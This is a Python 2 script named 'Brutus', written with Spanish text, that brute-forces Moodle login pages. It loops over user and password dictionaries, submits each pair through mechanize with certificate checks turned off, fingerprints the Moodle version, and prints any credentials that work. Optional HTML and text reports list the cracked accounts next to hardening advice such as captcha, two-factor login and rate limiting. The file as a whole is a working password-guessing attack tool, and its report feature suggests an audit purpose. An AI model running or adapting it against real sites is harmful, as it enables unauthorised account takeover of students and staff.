#!/usr/bin/python
# -*- coding: utf-8 -*-

#import httplib, urllib, 
import sys, os, ssl, time, mechanize, requests, re, warnings
warnings.filterwarnings("ignore")

def help():
	print("\t\t\t\t\t\tBRUTUS")
	print("\n\nNOMBRE\n\tBrutus - Brute Force Tool (for Moodle)")
	print("\n\nDESCRIPCION\n\tBrutus es una herramienta que puede realizar ataques de diccionario.")
	print("\tPuede generar reportes con un resumen de la configuración del ataque.")
	print("\n\nPARAMETROS\n")
	print("\n\t -d (obligatorio) - Especifica el recurso a analizar en el host. Si no se especifica, por defecto se usa '/login/index.php'.")
	print("\n\t -p (obligatorio) - Especifica un diccionario de contraseñas. Si no es un archivo, se toma como la contraseña a probar.")
	print("\n\t -r (opcional)    - Genera un reporte en 'html' y otro en 'texto plano' con la configuracion del ataque.")
	print("\n\t -s (obligatorio) - Especifica una dirección IP o nombre de dominio del objetivo.")
	print("\n\t -u (obligatorio) - Especifica un diccionario de usuarios. Si no es un archivo, se toma como el usuario a probar.")
	print("\n\t --sec (opcional) - Especifica que el protocolo a usar es HTTPS. Si no se especifica, se usa el protocolo HTTP.")
	print("\n\t --user (opcional) - Equivalente a '-u'.")
	print("\n\t --pass (opcional) - Equivalente a '-p'.")
	print("\n\t --port (opcional) - Especifica el puerto a usar. Si no se especifica, se usa el puerto 80 (HTTP) o 443 (HTTPS).")
	print("\n\n\nEJEMPLOS DE USO\n")
	print("\n\t\t\thttp://aulavirtual.com/login/index.php\n\tbrutus.py -u usuarios.txt -p hola123., -s aulavirtual.com --port 8080")
	print("\n\t\t\thttps://192.168.2.56/index.php\n\tbrutus.py --user usuarios.txt --pass passwords.txt -s 192.168.2.56 -d /index.php --sec\n\n")

def request(host, dir, port, usuarios, passwords, sec, rep):
	try:
		good = {}
		bad = 0 
		protocolo = "https" if sec else "http"
		url  = ('%s://%s:%s%s' % (protocolo,host,port,dir))
		version = getVersion(url)
	
		try:
			_create_unverified_https_context = ssl._create_unverified_context
		except AttributeError:
			# Legacy Python that doesn't verify HTTPS certificates by default
			pass
		else:
			# Handle target environment that doesn't support HTTPS verification
			ssl._create_default_https_context = _create_unverified_https_context
	
		br = mechanize.Browser()
		br.set_handle_robots(False)
		for u in usuarios:
			for p in passwords:
				response = br.open(url)
				br.addheaders = [("User-agent","Mozilla/5.0")]
				br.select_form(nr=1) #Selecciona la primer forma que encuentra
				br.form['username'] = u #asgina usuarios 
				br.form['password'] = p#asigna password
				response = br.submit() #Hace el submit
				code = response.read()
				if code.find('loginerrors') >= 0 or code.find("loginerrormessage") >= 0:
					bad = bad +1
				else:
					good[u]=p
		print "Credenciales Encontradas: \n\n"
		print "\t\t\tUSUARIO\t\tPASSWORD\n"
		for k, v in sorted(good.items()):
			print"\t\t\t%s\t\t%s\n" % (k,v)

	except:
		print "Ocurrio un error durante la conexion.\n"

		if len(good) > 0:
			print "Credenciales Encontradas: \n\n"
			print "\t\t\tUSUARIO\t\tPASSWORD\n"
			for k, v in sorted(good.items()):
				print"\t\t\t%s\t\t%s\n" % (k,v)
	if rep:
		reporthtml(good,bad,version)
		reporttxt(good,bad,version)


def getVersion(url):
	try:
		regex = r"(([0-9]{1,2}\.[0-9]{1,2}(\.[0-9]{1,2})?).{1,6}(B|b)uild)"
		r = requests.get(url, verify=False)
		match = re.search(regex,r.text)
		return match.group(2)
	except:		
		return None



def printError():
	print "Ocurrio un error al ejecutar el programa, Por favor vea la seccion de ayuda con '-h'\n"
	print "Los parametros obligatorios son los siguientes:\n\n"
	print "\t./brutus.py -s [host] -u [usuario|diccionario] -p [contraseña|diccionario]\n"


def reporthtml(good,bad,version):
	try:
		f=open('resultado.html', 'w')
		now = time.strftime("%c")
		data = {}
		data['Fecha']=now
		data['Direccion']=host
		data['Puerto']=port
		data['Recurso']=dir
		data['https']=sec
		data['Usuario']=usr
		data['Pasword']=passw
		data['Moodle'] = version
		data ['Intentos']=bad+len(good)
		f.write("<!DOCTYPE html>\n")
		f.write("<HTML>\n")
		f.write("\t<HEAD><TITLE>Reporte Brutus</TITLE></HEAD>\n")
		f.write("\t<BODY>\n")	
		f.write("\t\t<H1>Reporte Autogenerado con Brutus</H1>\n")
		f.write("\t\t<p>En este reporte se detalla la actividad realizada con Brutus</p>\n")
		f.write("\t\t<p><b>DATOS GENERALES</b></p>\n")
		f.write("\t\t<TABLE>\n")
	
		for k, v in data.items():
		        f.write("\t\t\t<TR><TD WIDTH=100>%s</TD><TD WIDTH=300>%s</TD><TR>\n" % (k,v))
		
		f.write("\t\t</TABLE>\n")
		f.write("\t\t<p><b>CREDENCIALES VALIDAS ENCONTRADAS: %s </b></p>\n" % (len(good)))
		f.write("\t\t<TABLE><TR><TD><b>USUARIO</b></TD><TD><b>PASSWORD</b></TD></TR>\n")
		
		for k, v in sorted(good.items()):
		        f.write("\t\t\t<TR><TD WIDTH=100>%s</TD><TD WIDTH=100>%s</TD></TR>\n" % (k,v))
	
		f.write("\t\t</TABLE>\n\t\t<p></p>\n")
		f.write("\t\t<p><b>RECOMENDACIONES</b></p>\n")
                f.write("\t\t<p>1.\tDeshabilitar usuarios por defecto</p>\n\t\t<p>2.\tUsar contraseñas seguras</p>\n")
                f.write("\t\t<p>3.\tAutenticación de dos factores</p>\n\t\t<p>\t4.\tUso de Captcha</p>\n")
                f.write("\t\t<p>5.\tValidar Entradas de usuario</p>\n\t\t<p>6.\tValidar peticiones HTTP</p>\n")
                f.write("\t\t<p>7.\tLimitar intentos de conexion y/o login</p>\n\t\t<p>8.\tRecurrir a bitacores</p>\n")
                f.write("\t\t<p>9.\tRespaldo de Bases de Datos y Archivos de configuracion</p>\n")

		f.write("\t</BODY>\n</HTML>")
		f.close()
		print "Se creo reporte HTML. Por favor revise el archivo 'reporte.html'"
	except  Exception as e:
		print e

def reporttxt(good,bad,version):

	try:
		now = time.strftime("%c")
		data = {}
		data['Fecha']=now
		data['Direccion']=host
		data['Puerto']=port
		data['Recurso']=dir
		data['https']=sec
		data['Usuario']=usr
		data['Pasword']=passw
		data['Moodle'] = version
		data['Intentos']=bad+len(good)
		f=open('resultado.txt', 'w')
		now = time.strftime("%c")
		f.write("\t\t\tReporte Brutus (Autogenerado)\n")
		f.write("\t\tEn este reporte se detalla la actividad realizada con Brutus\n\n")
		f.write("\t\tDATOS GENERALES\n\n")
	
		for k, v in data.items():
			f.write("\t\t\t%s\t\t%s\n" % (k,v))
	
		f.write("\n\n\t\tCREDENCIALES VALIDAS ENCONTRADAS %s\n\n" % (len(good)))
		f.write("\t\t\tUSUARIO\t\tPASSWORD\n")
	
		for k, v in sorted(good.items()):
			f.write("\t\t\t%s\t\t%s\n" % (k,v))
		f.write("\n\n\t\tRECOMENDACIONES\n\n")
		f.write("\t1.\tDeshabilitar usuarios por defecto\n\t2.\tUsar contraseñas seguras\n")
		f.write("\t3.\tAutenticación de dos factores\n\t4.\tUso de Captcha\n")
		f.write("\t5.\tValidar Entradas de usuario\n\t6.\tValidar peticiones HTTP\n")
		f.write("\t7.\tLimitar intentos de conexion y/o login\n\t8.\tRecurrir a bitacores\n")
		f.write("\t9.\tRespaldo de Bases de Datos y Archivos de configuracion\n")
		f.close()
		print "Se creo reporte en texto plano. Por favor revise el archivo 'reporte.txt'"
	except:
		print "Ocurrio un error al escribir el reporte en texto plano"

#incio
if len(sys.argv) == 2 and sys.argv[1] == "-h":
	help()
elif len(sys.argv) < 7: #por lo menos debe tener 7 parametros
	printError()
elif not("-s" in sys.argv and "-u" in sys.argv or "--user" in sys.argv and "-p" in sys.argv or "--pass" in sys.argv): #por lo menos debe incluir el usuario, contrasena, host y metodo de autenticacion
	printError()
else:
	try:
		sec = False
		rep = False
		hostIndex = sys.argv.index("-s")+1 #Guarda el indice de donde se encuentra el sitio
		if "--user" in sys.argv:
			userIndex = sys.argv.index("--user")+1 #Indice del usuario
		else:
			userIndex = sys.argv.index("-u")+1 #Indice del usuario
		if "--pass" in sys.argv:
			passIndex = sys.argv.index("--pass")+1 #Indice de la contrasena
		else:
			passIndex = sys.argv.index("-p")+1 #Indice de la contrasena
	
		host = sys.argv[hostIndex] #Guarda los parametros que se le pasaron
		usr = sys.argv[userIndex]
		passw = sys.argv[passIndex]
	
		if "--sec" in sys.argv: #Usara el protocolo HTTPS
			sec = True
		if "-r" in sys.argv or "--report" in sys.argv: #Usara el protocolo HTTPS
                        rep = True
		if "--port" in sys.argv: #puerto (si lo incluye unicamente)
			portIndex = sys.argv.index("--port")+1
			port = sys.argv[portIndex]
		else:
			port = 443 if sec else 80 #Si no se especifica el puerto por defecto es el 80 (http) o 443 (https)
	
		if "-d" in sys.argv: #directorio
			dirIndex = sys.argv.index("-d")+1
			dir = sys.argv[dirIndex]
		else:
			dir = "/login/index.php" #Si no se especifica, el directorio (recurso) por defecto es el login de moodle
	
		if os.path.isfile(usr): #Verifica si es un archivo 
			with open(usr) as f: #Lo abre y recorre todos sus elementos
				usuarios = f.read().splitlines()
		else:
			usuarios = [usr] #Si no es un archivo lo usa como usuario
		if os.path.isfile(passw):
			with open(passw) as f:
				passwords = f.read().splitlines()
		else:
			passwords = [passw]#si no es archivo lo usa como password
		request(host, dir, port, usuarios, passwords, sec, rep)
	except:
		printError()
